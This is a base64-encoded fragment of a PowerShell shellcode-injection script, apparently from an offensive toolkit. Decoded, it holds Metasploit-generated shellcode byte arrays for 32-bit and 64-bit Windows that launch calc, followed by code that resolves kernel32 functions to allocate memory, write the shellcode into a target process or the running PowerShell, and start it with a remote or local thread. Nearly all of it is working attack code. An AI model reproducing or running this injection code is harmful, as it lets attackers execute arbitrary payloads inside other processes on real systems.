CAgICAgIDB4MDMsMHg3ZCwweGY4LDB4M2IsMHg3ZCwweDI0LDB4NzUsMHhlMiwweDU4LDB4OGIsMHg1OCwweDI0LDB4MDEsMHhkMywweDY2LDB4OGIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDBjLDB4NGIsMHg4YiwweDU4LDB4MWMsMHgwMSwweGQzLDB4OGIsMHgwNCwweDhiLDB4MDEsMHhkMCwweDg5LDB4NDQsMHgyNCwweDI0LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg1YiwweDViLDB4NjEsMHg1OSwweDVhLDB4NTEsMHhmZiwweGUwLDB4NTgsMHg1ZiwweDVhLDB4OGIsMHgxMiwweGViLDB4ODYsMHg1ZCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NmEsMHgwMSwweDhkLDB4ODUsMHhiOSwweDAwLDB4MDAsMHgwMCwweDUwLDB4NjgsMHgzMSwweDhiLDB4NmYsMHg4NywweGZmLDB4ZDUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweGJiLDB4ZTAsMHgxZCwweDJhLDB4MGEsMHg2OCwweGE2LDB4OTUsMHhiZCwweDlkLDB4ZmYsMHhkNSwweDNjLDB4MDYsMHg3YywweDBhLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg4MCwweGZiLDB4ZTAsMHg3NSwweDA1LDB4YmIsMHg0NywweDEzLDB4NzIsMHg2ZiwweDZhLDB4MDAsMHg1MywweGZmLDB4ZDUsMHg2MywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NjEsMHg2YywweDYzLDB4MDApCgogICAgICAgICMgNjQtYml0IFBsCiAgICAgICAgIyBtc2ZQbCB3aW5kb3dzL3g2NC9leGVjIENNRD0iY2FsYyIgRVhJVEZVTkM9dGhyZWFkCiAgICAgICAgW0J5dGVbXV0gJFNoZWxsY29kZTY0ID0gQCgweGZjLDB4NDgsMHg4MywweGU0LDB4ZjAsMHhlOCwweGMwLDB4MDAsMHgwMCwweDAwLDB4NDEsMHg1MSwweDQxLDB4NTAsMHg1MiwweDUxLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg1NiwweDQ4LDB4MzEsMHhkMiwweDY1LDB4NDgsMHg4YiwweDUyLDB4NjAsMHg0OCwweDhiLDB4NTIsMHgxOCwweDQ4LDB4OGIsMHg1MiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MjAsMHg0OCwweDhiLDB4NzIsMHg1MCwweDQ4LDB4MGYsMHhiNywweDRhLDB4NGEsMHg0ZCwweDMxLDB4YzksMHg0OCwweDMxLDB4YzAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweGFjLDB4M2MsMHg2MSwweDdjLDB4MDIsMHgyYywweDIwLDB4NDEsMHhjMSwweGM5LDB4MGQsMHg0MSwweDAxLDB4YzEsMHhlMiwweGVkLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg1MiwweDQxLDB4NTEsMHg0OCwweDhiLDB4NTIsMHgyMCwweDhiLDB4NDIsMHgzYywweDQ4LDB4MDEsMHhkMCwweDhiLDB4ODAsMHg4OCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4NDgsMHg4NSwweGMwLDB4NzQsMHg2NywweDQ4LDB4MDEsMHhkMCwweDUwLDB4OGIsMHg0OCwweDE4LDB4NDQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDhiLDB4NDAsMHgyMCwweDQ5LDB4MDEsMHhkMCwweGUzLDB4NTYsMHg0OCwweGZmLDB4YzksMHg0MSwweDhiLDB4MzQsMHg4OCwweDQ4LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMSwweGQ2LDB4NGQsMHgzMSwweGM5LDB4NDgsMHgzMSwweGMwLDB4YWMsMHg0MSwweGMxLDB4YzksMHgwZCwweDQxLDB4MDEsMHhjMSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MzgsMHhlMCwweDc1LDB4ZjEsMHg0YywweDAzLDB4NGMsMHgyNCwweDA4LDB4NDUsMHgzOSwweGQxLDB4NzUsMHhkOCwweDU4LDB4NDQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDhiLDB4NDAsMHgyNCwweDQ5LDB4MDEsMHhkMCwweDY2LDB4NDEsMHg4YiwweDBjLDB4NDgsMHg0NCwweDhiLDB4NDAsMHgxYywweDQ5LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMSwweGQwLDB4NDEsMHg4YiwweDA0LDB4ODgsMHg0OCwweDAxLDB4ZDAsMHg0MSwweDU4LDB4NDEsMHg1OCwweDVlLDB4NTksMHg1YSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NDEsMHg1OCwweDQxLDB4NTksMHg0MSwweDVhLDB4NDgsMHg4MywweGVjLDB4MjAsMHg0MSwweDUyLDB4ZmYsMHhlMCwweDU4LDB4NDEsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDU5LDB4NWEsMHg0OCwweDhiLDB4MTIsMHhlOSwweDU3LDB4ZmYsMHhmZiwweGZmLDB4NWQsMHg0OCwweGJhLDB4MDEsMHgwMCwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4NDgsMHg4ZCwweDhkLDB4MDEsMHgwMSwweDAwLDB4MDAsMHg0MSwweGJhLDB4MzEsMHg4YiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NmYsMHg4NywweGZmLDB4ZDUsMHhiYiwweGUwLDB4MWQsMHgyYSwweDBhLDB4NDEsMHhiYSwweGE2LDB4OTUsMHhiZCwweDlkLDB4ZmYsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweGQ1LDB4NDgsMHg4MywweGM0LDB4MjgsMHgzYywweDA2LDB4N2MsMHgwYSwweDgwLDB4ZmIsMHhlMCwweDc1LDB4MDUsMHhiYiwweDQ3LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgxMywweDcyLDB4NmYsMHg2YSwweDAwLDB4NTksMHg0MSwweDg5LDB4ZGEsMHhmZiwweGQ1LDB4NjMsMHg2MSwweDZjLDB4NjMsMHgwMCkKICAgIH0KCiAgICBpZiAoICRQU0JvdW5kUGFyYW1ldGVyc1snUHJvY2Vzc0lEJ10gKQogICAgewogICAgICAgICMgSW5qZWN0IHNoZWxsY29kZSBpbnRvIHRoZSBzcGVjaWZpZWQgcHJvY2VzcyBJRAogICAgICAgICRPcGVuUHJvY2Vzc0FkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIE9wZW5Qcm9jZXNzCiAgICAgICAgJE9wZW5Qcm9jZXNzRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW1VJbnQzMl0sIFtCb29sXSwgW1VJbnQzMl0pIChbSW50UHRyXSkKICAgICAgICAkT3BlblByb2Nlc3MgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkT3BlblByb2Nlc3NBZGRyLCAkT3BlblByb2Nlc3NEZWxlZ2F0ZSkKICAgICAgICAkVmlydHVhbEFsbG9jRXhBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsQWxsb2NFeAogICAgICAgICRWaXJ0dWFsQWxsb2NFeERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50UHRyXSwgW1VpbnQzMl0sIFtVSW50MzJdLCBbVUludDMyXSkgKFtJbnRQdHJdKQogICAgICAgICRWaXJ0dWFsQWxsb2NFeCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRWaXJ0dWFsQWxsb2NFeEFkZHIsICRWaXJ0dWFsQWxsb2NFeERlbGVnYXRlKQogICAgICAgICRXcml0ZVByb2Nlc3NNZW1vcnlBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBXcml0ZVByb2Nlc3NNZW1vcnkKICAgICAgICAkV3JpdGVQcm9jZXNzTWVtb3J5RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnRQdHJdLCBbQnl0ZVtdXSwgW1VJbnQzMl0sIFtVSW50MzJdLk1ha2VCeVJlZlR5cGUoKSkgKFtCb29sXSkKICAgICAgICAkV3JpdGVQcm9jZXNzTWVtb3J5ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFdyaXRlUHJvY2Vzc01lbW9yeUFkZHIsICRXcml0ZVByb2Nlc3NNZW1vcnlEZWxlZ2F0ZSkKICAgICAgICAkQ3JlYXRlUmVtb3RlVGhyZWFkQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgQ3JlYXRlUmVtb3RlVGhyZWFkCiAgICAgICAgJENyZWF0ZVJlbW90ZVRocmVhZERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50UHRyXSwgW1VJbnQzMl0sIFtJbnRQdHJdLCBbSW50UHRyXSwgW1VJbnQzMl0sIFtJbnRQdHJdKSAoW0ludFB0cl0pCiAgICAgICAgJENyZWF0ZVJlbW90ZVRocmVhZCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRDcmVhdGVSZW1vdGVUaHJlYWRBZGRyLCAkQ3JlYXRlUmVtb3RlVGhyZWFkRGVsZWdhdGUpCiAgICAgICAgJENsb3NlSGFuZGxlQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgQ2xvc2VIYW5kbGUKICAgICAgICAkQ2xvc2VIYW5kbGVEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSkgKFtCb29sXSkKICAgICAgICAkQ2xvc2VIYW5kbGUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkQ2xvc2VIYW5kbGVBZGRyLCAkQ2xvc2VIYW5kbGVEZWxlZ2F0ZSkKICAgIAogICAgICAgIFdyaXRlLVZlcmJvc2UgIkluamVjdGluZyBzaGVsbGNvZGUgaW50byBQSUQ6ICRQcm9jZXNzSWQiCiAgICAgICAgCiAgICAgICAgaWYgKCAkRm9yY2UgLW9yICRwc0NtZGxldC5TaG91bGRDb250aW51ZSggJ0RvIHlvdSB3aXNoIHRvIGNhcnJ5IG91dCB5b3VyIGV2aWwgcGxhbnM/JywKICAgICAgICAgICAgICAgICAiSW5qZWN0aW5nIHNoZWxsY29kZSBpbmplY3RpbmcgaW50byAkKChHZXQtUHJvY2VzcyAtSWQgJFByb2Nlc3NJZCkuUHJvY2Vzc05hbWUpICgkUHJvY2Vzc0lkKSEiICkgKQogICAgICAgIHsKICAgICAgICAgICAgSW5qZWN0LVJlbW90ZVNoZWxsY29kZSAkUHJvY2Vzc0lkCiAgICAgICAgfQogICAgfQogICAgZWxzZQogICAgewogICAgICAgICMgSW5qZWN0IHNoZWxsY29kZSBpbnRvIHRoZSBjdXJyZW50bHkgcnVubmluZyBQb3dlclNoZWxsIHByb2Nlc3MKICAgICAgICAkVmlydHVhbEFsbG9jQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgVmlydHVhbEFsbG9jCiAgICAgICAgJFZpcnR1YWxBbGxvY0RlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbVUludDMyXSwgW1VJbnQzMl0sIFtVSW50MzJdKSAoW0ludFB0cl0pCiAgICAgICAgJFZpcnR1YWxBbGxvYyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRWaXJ0dWFsQWxsb2NBZGRyLCAkVmlydHVhbEFsbG9jRGVsZWdhdGUpCiAgICAgICAgJFZpcnR1YWxGcmVlQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgVmlydHVhbEZyZWUKICAgICAgICAkVmlydHVhbEZyZWVEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW1VpbnQzMl0sIFtVSW50MzJdKSAoW0Jvb2xdKQogICAgICAgICRWaXJ0dWFsRnJlZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRWaXJ0dWFsRnJlZUFkZHIsICRWaXJ0dWFsRnJlZURlbGVnYXRlKQogICAgICAgICRDcmVhdGVUaHJlYWRBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBDcmVhdGVUaHJlYWQKICAgICAgICAkQ3JlYXRlVGhyZWFkRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtVSW50MzJdLCBbSW50UHRyXSwgW0ludFB0cl0sIFtVSW50MzJdLCBbSW50UHRyXSkgKFtJbnRQdHJdKQogICAgICAgICRDcmVhdGVUaHJlYWQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkQ3JlYXRlVGhyZWFkQWRkciwgJENyZWF0ZVRocmVhZERlbGVnYXRlKQogICAgICAgICRXYWl0Rm9yU2luZ2xlT2JqZWN0QWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgV2FpdEZvclNpbmdsZU9iamVjdAogICAgICAgICRXYWl0Rm9yU2luZ2xlT2JqZWN0RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnQzMl0pIChbSW50XSkKICAgICAgICAkV2FpdEZvclNpbmdsZU9iamVjdCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRXYWl0Rm9yU2luZ2xlT2JqZWN0QWRkciwgJFdhaXRGb3JTaW5nbGVPYmplY3REZWxlZ2F0ZSkKICAgICAgICAKICAgICAgICBXcml0ZS1WZXJib3NlICJJbmplY3Rpbmcgc2hlbGxjb2RlIGludG8gUG93ZXJTaGVsbCIKICAgICAgICAKICAgICAgICBpZiAoICRGb3JjZSAtb3IgJHBzQ21kbGV0LlNob3VsZENvbnRpbnVlKCAnRG8geW91IHdpc2ggdG8gY2Fycnkgb3V0IHlvdXIgZXZpbCBwbGFucz8nLAogICAgICAgICAgICAgICAgICJJbmplY3Rpbmcgc2hlbGxjb2RlIGludG8gdGhlIHJ1bm5pbmcgUG93ZXJTaGVsbCBwcm9jZXNzISIgKSApCiAgICAgICAgewogICAgICAgICAgICBJbmplY3QtTG9jYWxTaGVsbGNvZGUKICAgICAgICB9CiAgICB9CiAgICAKfQo=
